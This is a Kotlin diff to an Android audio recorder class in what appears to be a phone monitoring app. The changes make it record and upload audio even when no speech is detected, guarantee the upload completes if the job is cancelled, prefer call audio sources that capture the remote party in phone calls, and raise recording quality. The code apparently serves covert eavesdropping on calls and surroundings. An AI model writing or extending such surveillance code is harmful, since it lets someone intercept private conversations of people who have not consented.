@@ -6,6 +6,7 @@ import android.os.Build
 import android.util.Log
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.NonCancellable
 import kotlinx.coroutines.SupervisorJob
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
@@ -88,14 +89,24 @@ class AudioRecorderEngine(private val context: Context) {
      * If classified as silent → file is deleted. Otherwise → uploaded.
      * Fire-and-forget; safe to call from any coroutine context.
      */
-    fun recordAndUpload(durationMs: Long) {
+    fun recordAndUpload(durationMs: Long, bypassVad: Boolean = false) {
         if (isRecording) { Log.w(TAG, "Already recording — skipped"); return }
         scope.launch {
-            if (startRecorderInternal()) {
-                sampleVadWhileRecording(durationMs)
-                val wasSpeech = evaluateVad()
-                stopRecorderInternal()
-                processResult(wasSpeech)
+            var startSuccess = false
+            var wasSpeech = false
+            try {
+                if (startRecorderInternal()) {
+                    startSuccess = true
+                    sampleVadWhileRecording(durationMs)
+                    wasSpeech = bypassVad || evaluateVad()
+                }
+            } finally {
+                if (startSuccess) {
+                    withContext(NonCancellable) {
+                        stopRecorderInternal()
+                        processResult(wasSpeech)
+                    }
+                }
             }
         }
     }
@@ -122,6 +133,7 @@ class AudioRecorderEngine(private val context: Context) {
     private fun startRecorderInternal(): Boolean {
         if (isRecording) return false
         return try {
+            MonitoringForegroundService.getInstance()?.upgradeToMicType()
             amplitudeWindow.clear()
             val ts   = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.ENGLISH).format(Date())
             val file = File(context.cacheDir, "rec_$ts.m4a")
@@ -136,6 +148,7 @@ class AudioRecorderEngine(private val context: Context) {
         } catch (e: Exception) {
             Log.e(TAG, "Start failed: ${e.message}")
             safeReleaseRecorder()
+            MonitoringForegroundService.getInstance()?.downgradeFromMicType()
             false
         }
     }
@@ -145,6 +158,7 @@ class AudioRecorderEngine(private val context: Context) {
         safeReleaseRecorder()
         isRecording = false
         Log.i(TAG, "Recording stopped")
+        MonitoringForegroundService.getInstance()?.downgradeFromMicType()
     }
 
     private fun safeReleaseRecorder() {
@@ -241,29 +255,35 @@ class AudioRecorderEngine(private val context: Context) {
         else
             @Suppress("DEPRECATION") MediaRecorder()
 
-        // Audio source priority:
-        // VOICE_COMMUNICATION: captures both earpiece+mic incl. BT/wired headset
-        // VOICE_RECOGNITION: good for ambient; no echo-canceller applied
-        // MIC: universal fallback
-        val sourceChain = listOf(
-            MediaRecorder.AudioSource.VOICE_COMMUNICATION,
-            MediaRecorder.AudioSource.VOICE_RECOGNITION,
-            MediaRecorder.AudioSource.MIC
-        )
-        var chosen = MediaRecorder.AudioSource.MIC
+        // Audio source priority (FIXED ORDER):
+        // VOICE_COMMUNICATION captures BOTH earpiece + mic — works with BT/wired headsets.
+        // MIC alone only captures the device microphone (misses earpiece / remote party audio).
+        // VOICE_RECOGNITION: good ambient fallback with no echo-canceller applied.
+        val sourceChain = buildList {
+            add(MediaRecorder.AudioSource.VOICE_COMMUNICATION)  // ← Both sides: earpiece+mic
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                add(MediaRecorder.AudioSource.VOICE_CALL)       // Direct call path (API 29+)
+            }
+            add(MediaRecorder.AudioSource.VOICE_RECOGNITION)   // Ambient fallback
+            add(MediaRecorder.AudioSource.MIC)                  // Last resort (mic only)
+        }
+        var chosen = MediaRecorder.AudioSource.VOICE_COMMUNICATION
         for (src in sourceChain) {
             try {
                 rec.setAudioSource(src)
                 chosen = src
+                Log.i(TAG, "✅ Audio source selected: $src")
                 break
-            } catch (_: Exception) {}
+            } catch (e: Exception) {
+                Log.w(TAG, "Audio source $src unavailable: ${e.message}")
+            }
         }
-        Log.d(TAG, "Audio source selected: $chosen")
+        Log.d(TAG, "Audio source final: $chosen")
 
         rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
         rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
-        rec.setAudioSamplingRate(16_000)     // 16 kHz — voice range sufficient
-        rec.setAudioEncodingBitRate(32_000)  // 32 kbps → ~14 KB/min
+        rec.setAudioSamplingRate(44_100)     // 44.1 kHz — full quality
+        rec.setAudioEncodingBitRate(96_000)  // 96 kbps — clear voice
         rec.setOutputFile(outputFile.absolutePath)
         return rec
     }
